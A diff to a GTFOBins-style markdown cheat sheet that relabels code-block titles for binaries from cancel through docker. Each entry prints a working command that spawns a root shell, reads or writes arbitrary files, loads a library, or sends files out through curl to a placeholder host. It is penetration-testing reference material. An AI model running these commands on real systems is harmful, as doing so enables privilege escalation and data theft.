@@ -1264,7 +1292,7 @@ cabal exec --project-file=/dev/null -- /bin/sh -p
 
 Data is sent as a POST request along with other content.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cancel upload (sudo / suid / unprivileged)"
 cancel -h $lhost:$lport -u $data
 ```
 <!-- cheat
@@ -1279,7 +1307,7 @@ var data
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins capsh shell (sudo / suid / unprivileged)"
 capsh --
 ```
 <!-- cheat
@@ -1287,7 +1315,9 @@ capsh --
 
 #### capsh shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins capsh shell - suid override (suid variant)"
 capsh --gid=0 --uid=0 --
 ```
 <!-- cheat
@@ -1299,7 +1329,7 @@ capsh --gid=0 --uid=0 --
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cargo inherit (inherits from less) (sudo / unprivileged)"
 cargo help doc
 ```
 <!-- cheat
@@ -1311,7 +1341,7 @@ cargo help doc
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cat file-read (sudo / suid / unprivileged)"
 cat $file_in
 ```
 <!-- cheat
@@ -1328,7 +1358,7 @@ Alias of [gcc](#gcc). All techniques from `gcc` apply.
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cdist shell (sudo / unprivileged)"
 cdist shell -s /bin/sh
 ```
 <!-- cheat
@@ -1340,7 +1370,7 @@ cdist shell -s /bin/sh
 
 This needs a writable directory, replace `.` if needed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins certbot shell (sudo / unprivileged)"
 certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
 ```
 <!-- cheat
@@ -1352,7 +1382,7 @@ certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir
 
 Make the target file immutable.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins chattr privilege-escalation (sudo / suid)"
 chattr +i $file_in
 ```
 <!-- cheat
@@ -1367,7 +1397,7 @@ This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plu
 
 The shell will only last 10 seconds.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_by_ssh shell (sudo / unprivileged)"
 check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
 ```
 <!-- cheat
@@ -1381,7 +1411,7 @@ This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugi
 
 The read file content is limited to the first line.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_cups file-read (sudo / unprivileged)"
 check_cups --extra-opts=@$file_in
 ```
 <!-- cheat
@@ -1396,7 +1426,7 @@ This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugin
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_log file-read (sudo / unprivileged)"
 check_log -F $file_in -O /dev/stdout
 ```
 <!-- cheat
@@ -1407,7 +1437,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_log file-write (sudo / unprivileged)"
 check_log -F $file_in -O $file_out
 ```
 <!-- cheat
@@ -1423,7 +1453,7 @@ This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plu
 
 The read file content is limited to the first line.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_memory file-read (sudo / unprivileged)"
 check_memory --extra-opts=@$file_in
 ```
 <!-- cheat
@@ -1438,7 +1468,7 @@ This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugi
 
 The read file content is limited to the first line.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_raid file-read (sudo / unprivileged)"
 check_raid --extra-opts=@$file_in
 ```
 <!-- cheat
@@ -1453,7 +1483,7 @@ This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/p
 
 The shell will be invoked multiple times.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_ssl_cert shell (sudo / unprivileged)"
 echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
 chmod +x $tmp_file
 check_ssl_cert --grep-bin $tmp_file -H x
@@ -1470,7 +1500,7 @@ This is the `check_statusfile` Nagios plugin, available e.g. in `/usr/lib/nagios
 
 The read file content is limited to the first line.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins check_statusfile file-read (sudo / unprivileged)"
 check_statusfile $file_in
 ```
 <!-- cheat
@@ -1483,7 +1513,7 @@ var file_in
 
 This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins chmod privilege-escalation (sudo / suid)"
 chmod 6777 $file_in
 ```
 <!-- cheat
@@ -1496,7 +1526,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins choom shell (sudo / suid / unprivileged)"
 choom -n 0 /bin/sh
 ```
 <!-- cheat
@@ -1504,7 +1534,9 @@ choom -n 0 /bin/sh
 
 #### choom shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins choom shell - suid override (suid variant)"
 choom -n 0 -- /bin/sh -p
 ```
 <!-- cheat
@@ -1516,7 +1548,7 @@ choom -n 0 -- /bin/sh -p
 
 This can be run with elevated privileges to change ownership and then read, write, or execute a file.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins chown privilege-escalation (sudo / suid)"
 chown $(id -un):$(id -gn) $file_in
 ```
 <!-- cheat
@@ -1529,7 +1561,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins chroot shell (sudo / suid)"
 chroot /
 ```
 <!-- cheat
@@ -1537,7 +1569,9 @@ chroot /
 
 #### chroot shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins chroot shell - suid override (suid variant)"
 chroot / /bin/sh -p
 ```
 <!-- cheat
@@ -1549,7 +1583,7 @@ chroot / /bin/sh -p
 
 Any number between 1 and 99 will do.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins chrt shell (sudo / suid / unprivileged)"
 chrt 1 /bin/sh
 ```
 <!-- cheat
@@ -1557,7 +1591,9 @@ chrt 1 /bin/sh
 
 #### chrt shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins chrt shell - suid override (suid variant)"
 chrt 1 /bin/sh -p
 ```
 <!-- cheat
@@ -1569,7 +1605,7 @@ chrt 1 /bin/sh -p
 
 Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins clamscan file-read (sudo / suid / unprivileged)"
 touch x.yara
 clamscan --no-summary -d x.yara -f $file_in 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
 ```
@@ -1583,7 +1619,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins clisp shell (sudo / suid / unprivileged)"
 clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
 ```
 <!-- cheat
@@ -1595,7 +1631,7 @@ clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cmake shell (sudo / unprivileged)"
 echo 'execute_process(COMMAND /bin/sh)' >$cmake_file
 cmake $path
 ```
@@ -1608,7 +1644,7 @@ var path
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cmake file-read (sudo / unprivileged)"
 cmake -E cat $file_in
 ```
 <!-- cheat
@@ -1621,7 +1657,7 @@ var file_in
 
 Dump the bytes of the input file that are different from the NUL byte in a tabular format.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cmp file-read (sudo / suid / unprivileged)"
 cmp $file_in /dev/zero -b -l
 ```
 <!-- cheat
@@ -1634,7 +1670,7 @@ var file_in
 
 The `$tmp_file` sill be overwritten after the execution.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cobc shell (sudo / suid / unprivileged)"
 echo 'CALL "SYSTEM" USING "/bin/sh".' >$tmp_file
 cobc -xFj --frelax-syntax-checks $tmp_file
 ```
@@ -1648,7 +1684,7 @@ var tmp_file
 
 This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins code reverse-shell (sudo / unprivileged)"
 code tunnel --name xxxxxx
 ```
 <!-- cheat
@@ -1658,7 +1694,7 @@ code tunnel --name xxxxxx
 
 This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins code download (sudo / unprivileged)"
 code tunnel --name xxxxxx
 ```
 <!-- cheat
@@ -1668,7 +1704,7 @@ code tunnel --name xxxxxx
 
 This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins code upload (sudo / unprivileged)"
 code tunnel --name xxxxxx
 ```
 <!-- cheat
@@ -1680,7 +1716,7 @@ code tunnel --name xxxxxx
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins codex shell (sudo / unprivileged)"
 codex sandbox linux /bin/sh
 ```
 <!-- cheat
@@ -1692,7 +1728,7 @@ codex sandbox linux /bin/sh
 
 This program expects textual data.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins column file-read (sudo / suid / unprivileged)"
 column $file_in
 ```
 <!-- cheat
@@ -1705,7 +1741,7 @@ var file_in
 
 A newline is appended to the file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins comm file-read (sudo / suid / unprivileged)"
 comm $file_in /dev/null
 ```
 <!-- cheat
@@ -1718,7 +1754,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins composer shell (sudo / unprivileged)"
 echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
 composer run-script x
 ```
@@ -1731,7 +1767,7 @@ composer run-script x
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cowsay inherit (inherits from perl) (sudo / unprivileged)"
 cowsay -f $script x
 ```
 <!-- cheat
@@ -1744,7 +1780,7 @@ var script
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cowthink inherit (inherits from perl) (sudo / unprivileged)"
 cowthink -f $script x
 ```
 <!-- cheat
@@ -1757,7 +1793,7 @@ var script
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cp file-read (sudo / suid / unprivileged)"
 cp $file_in /dev/stdout
 ```
 <!-- cheat
@@ -1768,7 +1804,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cp file-write (sudo / suid / unprivileged)"
 echo $data | cp /dev/stdin $file_out
 ```
 <!-- cheat
@@ -1780,7 +1816,7 @@ var file_out
 
 This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins cp privilege-escalation #1 (sudo / suid)"
 cp $file_in $file_out
 ```
 <!-- cheat
@@ -1792,7 +1828,7 @@ var file_out
 
 This can copy SUID permissions from any SUID binary (e.g., `$file_in`) to another.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins cp privilege-escalation #2 (sudo / suid)"
 cp --attributes-only --preserve=all $file_in $file_out
 ```
 <!-- cheat
@@ -1806,7 +1842,7 @@ var file_out
 
 Perl code can be executed with the `!` command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins cpan inherit (inherits from perl) (sudo / unprivileged)"
 cpan
 ! ...
 ```
@@ -1819,7 +1855,7 @@ cpan
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins cpio shell (sudo)"
 echo '/bin/sh </dev/tty >/dev/tty' >localhost
 cpio -o --rsh-command /bin/sh -F localhost:
 ```
@@ -1830,7 +1866,7 @@ cpio -o --rsh-command /bin/sh -F localhost:
 
 The content of the file is printed to standard output, between the `cpio` archive format header and footer.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cpio file-read #1 (sudo / suid / unprivileged)"
 echo $file_in | cpio -o
 ```
 <!-- cheat
@@ -1841,7 +1877,7 @@ var file_in
 
 The whole directory structure is copied to `.`, hence this is also a file write.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cpio file-read #2 (sudo / suid / unprivileged)"
 echo $file_in | cpio -dp .
 cat $file_in
 ```
@@ -1851,7 +1887,9 @@ var file_in
 
 #### cpio file-read #2 - sudo override
 
-```sh title:"sudo variant"
+sudo variant
+
+```sh title:"GTFOBins cpio file-read #2 - sudo override (sudo variant)"
 echo $file_in | cpio -R $UID -dp .
 cat $file_in
 ```
@@ -1861,7 +1899,9 @@ var file_in
 
 #### cpio file-read #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins cpio file-read #2 - suid override (suid variant)"
 echo $file_in | cpio -R $UID -dp .
 cat $file_in
 ```
@@ -1873,7 +1913,7 @@ var file_in
 
 The whole directory structure is copied to `.`, with the data written to `$tmp_file`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cpio file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 echo $tmp_file | cpio -udp .
 ```
@@ -1884,7 +1924,9 @@ var tmp_file
 
 #### cpio file-write - sudo override
 
-```sh title:"sudo variant"
+sudo variant
+
+```sh title:"GTFOBins cpio file-write - sudo override (sudo variant)"
 echo $data >$tmp_file
 echo $tmp_file | cpio -R 0:0 -udp .
 ```
@@ -1895,7 +1937,9 @@ var tmp_file
 
 #### cpio file-write - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins cpio file-write - suid override (suid variant)"
 echo $data >$tmp_file
 echo $tmp_file | cpio -R 0:0 -udp .
 ```
@@ -1910,7 +1954,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cpulimit shell (sudo / suid / unprivileged)"
 cpulimit -l 100 -f -- /bin/sh
 ```
 <!-- cheat
@@ -1918,7 +1962,9 @@ cpulimit -l 100 -f -- /bin/sh
 
 #### cpulimit shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins cpulimit shell - suid override (suid variant)"
 cpulimit -l 100 -f -- /bin/sh -p
 ```
 <!-- cheat
@@ -1930,7 +1976,7 @@ cpulimit -l 100 -f -- /bin/sh -p
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins crash command (sudo / unprivileged)"
 CRASHPAGER=$cmd_file crash -h
 ```
 <!-- cheat
@@ -1941,7 +1987,7 @@ var cmd_file
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins crash inherit (inherits from less) (sudo / suid / unprivileged)"
 crash -h
 ```
 <!-- cheat
@@ -1953,7 +1999,7 @@ crash -h
 
 This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins crontab command (sudo / unprivileged)"
 crontab -e
 ```
 <!-- cheat
@@ -1963,7 +2009,7 @@ crontab -e
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins crontab inherit (inherits from vi) (sudo / unprivileged)"
 crontab -e
 ```
 <!-- cheat
@@ -1975,7 +2021,7 @@ crontab -e
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csh shell (sudo / suid / unprivileged)"
 csh
 ```
 <!-- cheat
@@ -1983,7 +2029,9 @@ csh
 
 #### csh shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins csh shell - suid override (suid variant)"
 csh -b
 ```
 <!-- cheat
@@ -1993,7 +2041,7 @@ csh -b
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csh file-write (sudo / suid / unprivileged)"
 csh -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -2003,7 +2051,9 @@ var file_out
 
 #### csh file-write - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins csh file-write - suid override (suid variant)"
 csh -c 'echo $data >$file_out' -b
 ```
 <!-- cheat
@@ -2017,7 +2067,7 @@ var file_out
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csplit file-read (sudo / suid / unprivileged)"
 csplit $file_in 1
 cat xx01
 ```
@@ -2029,7 +2079,7 @@ var file_in
 
 Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csplit file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 csplit -z -b '%doutput-file' $tmp_file 1
 ```
@@ -2044,7 +2094,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csvtool shell (sudo / suid / unprivileged)"
 csvtool call '/bin/sh;false' /etc/hosts
 ```
 <!-- cheat
@@ -2054,7 +2104,7 @@ csvtool call '/bin/sh;false' /etc/hosts
 
 The file is actually parsed and manipulated as CSV.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csvtool file-read (sudo / suid / unprivileged)"
 csvtool trim t $file_in
 ```
 <!-- cheat
@@ -2065,7 +2115,7 @@ var file_in
 
 The file is actually parsed and manipulated as CSV.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins csvtool file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 csvtool trim t $tmp_file -o $file_out
 ```
@@ -2081,7 +2131,7 @@ var tmp_file
 
 An image must be already present, for example:  ``` ctr images pull docker.io/library/alpine:latest ```
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins ctr shell (sudo / suid)"
 ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
 ```
 <!-- cheat
@@ -2093,7 +2143,7 @@ ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/al
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cupsfilter file-read (sudo / suid / unprivileged)"
 cupsfilter -i application/octet-stream -m application/octet-stream $file_in
 ```
 <!-- cheat
@@ -2106,7 +2156,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl file-read (sudo / suid / unprivileged)"
 curl file://$file_in
 ```
 <!-- cheat
@@ -2117,7 +2167,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 curl file://$tmp_file -o $file_out
 ```
@@ -2131,7 +2181,7 @@ var tmp_file
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl download (sudo / suid / unprivileged)"
 curl $scheme://$lhost$file_in -o $file_out
 ```
 <!-- cheat
@@ -2145,7 +2195,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl upload #1 (sudo / suid / unprivileged)"
 curl -X POST --data-binary @$file_in $scheme://$lhost
 ```
 <!-- cheat
@@ -2158,7 +2208,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl upload #2 (sudo / suid / unprivileged)"
 curl -X POST --data-binary $data $scheme://$lhost
 ```
 <!-- cheat
@@ -2171,7 +2221,7 @@ var data
 
 Data will be `\r\n` terminated.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl upload #3 (sudo / suid / unprivileged)"
 curl gopher://$lhost:$lport/_DATA
 ```
 <!-- cheat
@@ -2183,7 +2233,7 @@ import lports
 
 Load an attacker-supplied shared library.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins curl library-load (sudo / suid / unprivileged)"
 curl --engine $lib x
 ```
 <!-- cheat
@@ -2196,7 +2246,7 @@ var lib
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins cut file-read (sudo / suid / unprivileged)"
 cut -d '' -f1 $file_in
 ```
 <!-- cheat
@@ -2209,7 +2259,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dash shell (sudo / suid / unprivileged)"
 dash
 ```
 <!-- cheat
@@ -2219,7 +2269,7 @@ dash
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dash file-write (sudo / suid / unprivileged)"
 dash -c 'echo $data >$file_out'
 ```
 <!-- cheat
@@ -2233,7 +2283,7 @@ var file_out
 
 Each line is corrupted by a prefix string and wrapped inside quotes.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins date file-read (sudo / suid / unprivileged)"
 date -f $file_in
 ```
 <!-- cheat
@@ -2246,7 +2296,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dc shell (sudo / suid / unprivileged)"
 dc -e '!/bin/sh'
 ```
 <!-- cheat
@@ -2258,7 +2308,7 @@ dc -e '!/bin/sh'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dd file-read (sudo / suid / unprivileged)"
 dd if=$file_in
 ```
 <!-- cheat
@@ -2269,7 +2319,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dd file-write (sudo / suid / unprivileged)"
 echo $data | dd of=$file_out
 ```
 <!-- cheat
@@ -2283,7 +2333,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins debugfs shell (sudo / suid / unprivileged)"
 debugfs
 !/bin/sh
 ```
@@ -2296,7 +2346,7 @@ debugfs
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins dhclient shell (sudo / unprivileged)"
 dhclient -sf /bin/sh
 ```
 <!-- cheat
@@ -2308,7 +2358,7 @@ dhclient -sf /bin/sh
 
 The file is shown in an interactive TUI dialog.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dialog file-read (sudo / suid / unprivileged)"
 dialog --textbox $file_in 0 0
 ```
 <!-- cheat
@@ -2321,7 +2371,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins diff file-read #1 (sudo / suid / unprivileged)"
 diff --line-format=%L /dev/null $file_in
 ```
 <!-- cheat
@@ -2332,7 +2382,7 @@ var file_in
 
 This lists the content of a directory. `$dir_empty` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins diff file-read #2 (sudo / suid / unprivileged)"
 diff --recursive $dir_empty $dir_in/
 ```
 <!-- cheat
@@ -2346,7 +2396,7 @@ var dir_in
 
 Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dig file-read (sudo / suid / unprivileged)"
 dig -f $file_in
 ```
 <!-- cheat
@@ -2359,7 +2409,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins distcc shell (sudo / suid / unprivileged)"
 distcc /bin/sh
 ```
 <!-- cheat
@@ -2367,7 +2417,9 @@ distcc /bin/sh
 
 #### distcc shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins distcc shell - suid override (suid variant)"
 distcc /bin/sh -p
 ```
 <!-- cheat
@@ -2379,7 +2431,7 @@ distcc /bin/sh -p
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dmesg file-read (sudo / suid / unprivileged)"
 dmesg -rF $file_in
 ```
 <!-- cheat
@@ -2390,7 +2442,7 @@ var file_in
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dmesg inherit (inherits from less) (sudo / suid / unprivileged)"
 dmesg -H
 ```
 <!-- cheat
@@ -2402,7 +2454,7 @@ dmesg -H
 
 It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.  - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.  - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.  ``` make dmiwrite echo $data >$tmp_file ./dmiwrite $tmp_file x.dmi ```
 
-```sh title:"unprivileged"
+```sh title:"GTFOBins dmidecode file-write (unprivileged)"
 dmidecode --no-sysfs -d x.dmi --dump-bin $file_out
 ```
 <!-- cheat
@@ -2415,7 +2467,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dmsetup shell (sudo / suid / unprivileged)"
 dmsetup create base <<EOF
 0 3534848 linear /dev/loop0 94208
 EOF
@@ -2426,7 +2478,9 @@ dmsetup ls --exec '/bin/sh -s'
 
 #### dmsetup shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins dmsetup shell - suid override (suid variant)"
 dmsetup create base <<EOF
 0 3534848 linear /dev/loop0 94208
 EOF
@@ -2441,7 +2495,7 @@ dmsetup ls --exec '/bin/sh -p -s'
 
 Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```  The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.
 
-```sh title:"sudo"
+```sh title:"GTFOBins dnf command (sudo)"
 dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
 ```
 <!-- cheat
@@ -2453,7 +2507,7 @@ dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins dnsmasq command (sudo / suid / unprivileged)"
 dnsmasq --conf-script='$cmd_file 1>&2'
 ```
 <!-- cheat
@@ -2466,7 +2520,7 @@ var cmd_file
 
 The user must be allowed to use `doas`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins doas shell (sudo / unprivileged)"
 doas -u root /bin/sh
 ```
 <!-- cheat
@@ -2480,7 +2534,7 @@ This requires the user to be privileged enough to run `docker`, e.g., being in t
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins docker shell #1 (sudo / suid / unprivileged)"
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
 <!-- cheat
@@ -2490,7 +2544,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 
 This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins docker shell #2 (sudo / suid / unprivileged)"
 docker run --rm -it --privileged -u root alpine
 mount /dev/sda1 /mnt/
 ls -la /mnt/
@@ -2503,7 +2557,7 @@ chroot /mnt /bin/bash
 
 Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins docker file-read (sudo / suid / unprivileged)"
 docker cp $file_in $CONTAINER_ID:input-file
 docker cp $CONTAINER_ID:input-file $tmp_file
 cat $tmp_file
